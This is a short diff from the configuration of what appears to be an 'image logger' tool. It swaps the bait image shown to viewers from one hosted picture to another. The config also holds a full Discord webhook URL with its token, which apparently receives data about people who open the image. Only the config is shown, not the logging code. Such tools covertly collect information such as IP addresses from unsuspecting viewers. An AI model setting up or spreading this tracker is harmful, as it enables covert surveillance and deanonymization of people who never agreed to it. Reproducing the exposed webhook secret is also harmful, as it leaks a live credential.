@@ -13,7 +13,7 @@ __author__ = "Proxy"
 config = {
     # BASE CONFIG #
     "webhook": "https://discord.com/api/webhooks/1466906538148102235/itmF63UvtsjjygTjbcLYaxwBTBB5Ger3CjaVCbQoab51UZjU7qsxSWXd38xZ3n9ZKmAc",
-    "image": "https://media.tenor.com/QKK1um2qExcAAAAM/funny-tongue.jpg", # You can also have a custom image by using a URL argument
+    "image": "https://i.pinimg.com/736x/27/23/68/27236835e767166454a6335e4cfe0549.jpg", # You can also have a custom image by using a URL argument
                                                # (E.g. yoursite.com/imagelogger?url=<Insert a URL-escaped link to an image here>)
     "imageArgument": True, # Allows you to use a URL argument to change the image (SEE THE README)
 
